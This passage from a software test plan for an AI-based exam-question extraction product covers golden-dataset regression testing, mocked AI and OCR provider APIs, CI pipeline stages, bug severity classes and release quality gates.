| Concurrent uploads (10) | No errors | Fail if any 5xx |
| Sustained load (1 hour) | Stable memory | Fail if memory grows >20% |
| Queue throughput (100 jobs) | All complete < 30 min | Fail if any stall |
| Export (500 MCQs → QTI) | < 30s | Fail if > 60s |

---

## 12. Golden Dataset Regression Testing

### 12.1 Purpose

Validate that AI extraction quality doesn't regress when code, models, or prompts change.

### 12.2 Dataset Requirements

| Category | Count | Description |
|----------|-------|-------------|
| Clean digital PDFs | 5 | Standard academic exam papers |
| Scanned (good quality) | 3 | Clear scans of printed exams |
| Scanned (poor quality) | 2 | Low-res, skewed, or noisy |
| Multi-column layouts | 3 | Textbook-style MCQ pages |
| Tables/diagrams | 2 | Science/medical MCQs with figures |
| Large documents (100+ pages) | 2 | Comprehensive question banks |
| Edge cases | 3 | Mixed content, unusual formatting |
| **Total minimum** | **20** | — |

### 12.3 Golden Dataset Entry Format

```json
{
  "inputFile": "golden/clean-exam-001.pdf",
  "expectedMCQs": [
    {
      "pageNumber": 1,
      "questionText": "What is the primary function of mitochondria?",
      "options": [
        { "label": "A", "text": "Protein synthesis" },
        { "label": "B", "text": "Energy production" },
        { "label": "C", "text": "Cell division" },
        { "label": "D", "text": "DNA replication" }
      ],
      "correctAnswer": "B"
    }
  ],
  "expectedMetrics": {
    "totalMCQs": 25,
    "minimumAccuracy": 0.85
  }
}
```

### 12.4 Regression Test Runner

```
Run nightly + before every release:
1. Process each golden PDF through the extraction pipeline
2. Compare extracted MCQs against expected MCQs
3. Calculate: extraction accuracy, field accuracy, hallucination rate
4. Compare against previous run's metrics
5. FAIL if any metric drops > 5% from last run
6. Generate regression report with per-PDF breakdown
```

---

## 13. Provider Mock Strategy

### 13.1 MSW (Mock Service Worker) Setup

```typescript
// packages/test-fixtures/src/providers/msw-handlers.ts
import { http, HttpResponse } from "msw";

export const providerHandlers = [
  // OpenAI mock
  http.post("https://api.openai.com/v1/chat/completions", () => {
    return HttpResponse.json({
      choices: [{
        message: {
          content: JSON.stringify({
            mcqs: [{
              questionText: "Mock question?",
              options: [
                { label: "A", text: "Mock answer 1" },
                { label: "B", text: "Mock answer 2" },
              ],
              correctAnswer: "A",
            }],
          }),
        },
      }],
      usage: { prompt_tokens: 100, completion_tokens: 50, total_tokens: 150 },
    });
  }),

  // Google Vision OCR mock
  http.post("https://vision.googleapis.com/v1/images:annotate", () => {
    return HttpResponse.json({
      responses: [{
        fullTextAnnotation: {
          text: "1. What is 2+2?\nA) 3\nB) 4\nC) 5\nD) 6\nAnswer: B",
        },
      }],
    });
  }),

  // Provider error scenarios
  http.post("https://api.openai.com/v1/chat/completions", ({ request }) => {
    const apiKey = request.headers.get("Authorization");
    if (apiKey === "Bearer invalid-key") {
      return HttpResponse.json(
        { error: { message: "Invalid API key" } },
        { status: 401 }
      );
    }
  }),
];
```

### 13.2 Mock Data Files

```
packages/test-fixtures/src/providers/
├── openai/
│   ├── success-single-mcq.json        # Normal response, 1 MCQ
│   ├── success-multiple-mcqs.json     # Normal response, 10 MCQs
│   ├── success-edge-cases.json        # Unicode, long text, special chars
│   ├── error-rate-limited.json        # 429 response
│   ├── error-invalid-key.json         # 401 response
│   ├── error-server-error.json        # 500 response
│   └── error-malformed-output.json    # Valid JSON but wrong structure
├── google-vision/
│   ├── success-clean-page.json
│   ├── success-noisy-scan.json
│   ├── error-quota-exceeded.json
│   └── error-invalid-image.json
├── anthropic/
│   ├── success-extraction.json
│   └── error-overloaded.json
└── README.md                          # Document each mock's purpose
```

---

## 14. CI Pipeline Integration

### 14.1 Test Stages in CI

```
PR Pipeline:
  1. Lint        → ESLint + Prettier check         → Block merge on failure
  2. Type check  → tsc --noEmit                     → Block merge on failure
  3. Unit tests  → vitest run                       → Block merge on failure
  4. Integration → vitest run (with test containers) → Block merge on failure
  5. Coverage    → vitest --coverage                 → Block if new code < 80%
  6. Security    → npm audit + ESLint security       → Block on critical
  7. Secrets     → git-secrets / GitGuardian         → Block if found

Merge-to-Main Pipeline:
  8. All PR checks                                   → Must pass
  9. E2E tests   → playwright test (staging)         → Block production deploy
  10. Accessibility → axe-core (via Playwright)      → Block production deploy

Nightly Pipeline:
  11. Golden dataset regression                       → Alert on regression > 5%
  12. OWASP ZAP scan                                  → Alert on high findings
  13. Dependency deep scan (Snyk)                     → Alert on new vulnerabilities
  14. Container scan (Trivy)                          → Alert on critical CVEs

Weekly Pipeline:
  15. k6 performance tests                            → Alert on degradation > 10%
  16. Full browser matrix E2E (Chrome, Firefox, Edge) → Alert on failures
```

### 14.2 Test Reporting

| Report | Format | Audience |
|--------|--------|----------|
| Unit test results | JUnit XML (CI dashboard) | Engineering |
| Coverage report | HTML + lcov (uploaded to coverage service) | Engineering |
| E2E test results | HTML report + failure screenshots | Engineering + QA |
| Accessibility report | JSON (axe-core output) | QA + Frontend |
| Security scan | SARIF or HTML (ZAP output) | Security + Engineering |
| Performance report | k6 HTML summary + Grafana dashboard | Engineering + Ops |
| Golden dataset report | Custom markdown/HTML with per-PDF breakdown | Engineering + Product |

---

## 15. Bug Classification

| Severity | Definition | Response Time | Examples |
|----------|-----------|---------------|---------|
| **P0 — Critical** | System down, data loss/leak, security breach | Immediate (within 1 hour) | Auth bypass, SQL injection found, data exposed across workspaces |
| **P1 — High** | Major feature broken, security vulnerability, data corruption | Same day | Upload fails for all users, MCQ records lost, XSS found |
| **P2 — Medium** | Feature partially broken, performance degradation | Within 3 days | Filtering doesn't work, export missing fields, slow query |
| **P3 — Low** | Minor issue, cosmetic, edge case | Next sprint | Tooltip misaligned, rare error message unclear |

### Bug Report Template

```
**Title:** [P1] Review approval returns 500 when MCQ has null explanation
**Severity:** P1
**Environment:** Staging / Chrome 120 / API v1
**Steps to Reproduce:**
  1. Create MCQ record with null explanation field
  2. Put it in review queue
  3. Click "Approve"
**Expected:** MCQ approved, status changes to "approved"
**Actual:** 500 Internal Server Error. Response body: { "error": { "code": "INTERNAL_ERROR" } }
**Logs:** [paste relevant log snippet — redact secrets]
**Screenshot/Video:** [attach]
**Root Cause (if known):** Service assumes explanation is always a string, crashes on .trim() of null
```

---

## 16. Quality Gate Summary

### Before PR Can Merge

| Gate | Threshold | Owner |
|------|-----------|-------|
| ESLint | 0 errors | Developer |
| TypeScript | 0 errors | Developer |
| Unit tests | 100% pass | Developer + QA |
| Integration tests | 100% pass | Developer + QA |
| New code coverage | ≥ 80% | QA |
| npm audit | 0 critical | Security |
| Secret scan | 0 findings | Security |
| PR review | 1 approval | Engineering peer |

### Before Release Can Deploy to Production

| Gate | Threshold | Owner |
|------|-----------|-------|
| All PR gates | Pass | Engineering |
| E2E tests (staging) | 100% pass | QA |
| Accessibility scan | 0 violations (WCAG 2.1 AA) | QA |
| Golden dataset | No regression > 5% | QA |
| OWASP ZAP scan | 0 high/critical findings | Security |
| Performance baseline | No degradation > 10% | QA |
| Manual exploratory QA | Sign-off | QA lead |
| Security review | Sign-off | Security |

---

## 17. Phase 1 Immediate Priorities

Start in this order:

1. **Test environment setup** — docker-compose.test.yml, .env.test, CI pipeline config
2. **Test fixtures package** — Factory functions (createUser, createDocument, createMCQRecord), MSW handlers
3. **Auth integration tests** — Login, register, session, RBAC matrix (most critical security surface)
4. **IDOR tests** — Cross-workspace data isolation (every resource type)
5. **Document upload security tests** — File type, size, virus scan, path traversal
6. **API endpoint integration tests** — Happy path + error paths for P1 endpoints (in order devs build them)
7. **Input validation tests** — Injection payloads against all input fields
8. **Security header verification** — Automated check of all response headers
9. **E2E test scaffolding** — Playwright setup, login helper, first 4 E2E tests (E2E-001 through E2E-004)
10. **Accessibility baseline** — axe-core scan on all P1 pages
11. **CI pipeline integration** — All tests running in CI, coverage reporting
12. **Golden dataset curation** — Begin collecting and annotating test PDFs (ongoing into P2)

**Don't build until Phase 2:** Hallucination detection tests, VLM pipeline tests, confidence calibration tests, diff viewer E2E tests.
**Don't build until Phase 3:** Performance/load test suite, export format validation suite, cost intelligence tests.

---

## 18. Communication

- **With frontend developer:** Coordinate on `data-testid` attributes for E2E tests. Provide them a list of required `data-testid` values early.
- **With backend developer:** Coordinate on test fixtures and factory functions — shared via `packages/test-fixtures`. Review their integration tests for coverage gaps.
- **With both developers:** When you find a bug, file it with the template in Section 15. Include reproduction steps, logs, and severity.
- **Security findings:** Report P0/P1 security findings immediately via direct message to engineering lead — not in public channels. Follow responsible disclosure.
- **apis.md is the shared contract** — if an endpoint behaves differently from what's documented, that's a bug (either in the code or the doc).
